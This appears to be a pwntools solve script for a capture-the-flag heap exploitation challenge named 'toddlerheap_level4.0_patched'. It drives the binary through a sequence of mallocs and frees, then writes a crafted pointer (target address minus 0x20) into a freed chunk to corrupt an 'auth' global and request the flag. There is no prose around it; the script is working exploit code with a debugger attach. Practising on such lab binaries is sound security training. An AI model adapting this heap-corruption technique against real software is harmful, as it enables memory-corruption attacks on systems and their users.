from pwn import * 

binary = './toddlerheap_level4.0_patched'

p = process(binary)

s = '''
b mallo c
b free
'''


auth = 0x004041c0

p.sendline("malloc 0 3024")
p.sendline("malloc 1 5000") # guarding chunk 





p.sendline("malloc 3 3000")
p.sendline("malloc 4 5000") # guarding chunk 


p.sendline("free 0")

p.sendline("malloc 5 6000")



p.sendline("free 3")

'''
p.sendline("malloc 6 6000")

p.sendline("puts 0")
p.sendline("puts 3")
'''

p.sendline("safe_read 0")
p.sendline(b"A" * 24 + p64(0x004041c0 - 0x20))

p.sendline("malloc 6 6000")


p.sendline("send_flag")
gdb.attach(p, s)
p.interactive()

